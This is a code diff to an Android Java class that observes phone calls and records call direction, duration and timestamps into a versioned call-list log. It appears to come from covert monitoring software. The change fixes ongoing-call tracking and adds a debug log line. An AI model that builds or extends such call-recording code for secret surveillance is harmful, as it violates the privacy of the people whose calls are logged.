@@ -50,14 +50,19 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 		final String nametype = "u";
 		final String note = "no notes";
 
-		boolean outgoing = !call.isIncoming();
+		
+		Log.d("QZ", TAG + " (notification): " + call);
 		if (call.isOngoing()) {
-			callInAction = call;
+			// Arrivano due call, in uscita, una con il number, l'altra senza.
+			if (call.getNumber().length() > 0) {
+				callInAction = call;
+			}
 			return 0;
-		} 
+		}
 
 		Check.asserts(callInAction != null, "null callInAction");
-
+		
+		boolean outgoing = !callInAction.isIncoming();
 		int duration = call.getDuration(callInAction);
 		final int LOG_CALLIST_VERSION = 0;
 
@@ -76,8 +81,8 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 		final DateTime from = new DateTime(callInAction.getTimestamp());
 		final DateTime to = new DateTime(call.getTimestamp());
 
-		callInAction=null;
-		
+		callInAction = null;
+
 		databuffer.writeInt(len);
 		databuffer.writeInt(LOG_CALLIST_VERSION);
 		databuffer.writeLong(from.getFiledate());
